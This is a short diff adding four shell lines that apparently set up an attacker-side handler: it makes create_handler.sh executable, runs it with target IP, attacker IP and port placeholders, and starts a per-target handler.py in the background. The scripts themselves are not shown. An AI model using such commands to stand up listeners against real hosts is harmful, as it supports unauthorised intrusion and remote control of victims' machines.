@@ -1,0 +1,4 @@
+chmod 700 ~/create_handler.sh
+/bin/bash ~/create_handler.sh {ip_target} {ip_attacker} {port}
+
+nohup python ~/{ip_target}.handler.py &
